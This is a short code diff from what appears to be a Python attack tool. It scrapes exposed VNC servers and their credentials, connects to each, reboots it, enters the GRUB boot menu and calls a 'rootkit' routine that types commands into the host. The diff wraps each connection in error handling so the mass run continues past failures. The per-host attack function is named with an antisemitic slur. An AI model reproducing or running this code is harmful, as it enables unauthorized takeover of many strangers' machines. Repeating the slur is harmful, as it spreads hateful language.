@@ -69,13 +69,16 @@ async def rootkit(client):
     client.keyboard.press("Return")
 
 async def jew(ip, port, username, password):
-    print(f"connecting to {ip}:{port}")
-    async with asyncvnc.connect(ip, int(port), username, password) as client:
-        print(f"connected to {ip}:{port}")
-        await reboot(client)
-        await grub_enter(client)
-        await grub_boot(client)
-        await rootkit(client)
+    try:
+        print(f"connecting to {ip}:{port}")
+        async with asyncvnc.connect(ip, int(port), username, password) as client:
+            print(f"connected to {ip}:{port}")
+            await reboot(client)
+            await grub_enter(client)
+            await grub_boot(client)
+            await rootkit(client)
+    except:
+        return
 
 async def main():
     vncs = scrape.get_vncs(*sys.argv[1:])
@@ -88,7 +91,7 @@ async def main():
         for vnc in vncs:
             f.write(f"{vnc['HostIp']}:{vnc['Port']}\n")
     tasks = [jew(vnc["HostIp"], vnc["Port"], vnc["Username"], vnc["Password"]) for vnc in vncs]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    await asyncio.gather(*tasks)
 
 if __name__ == '__main__':
     asyncio.run(main())
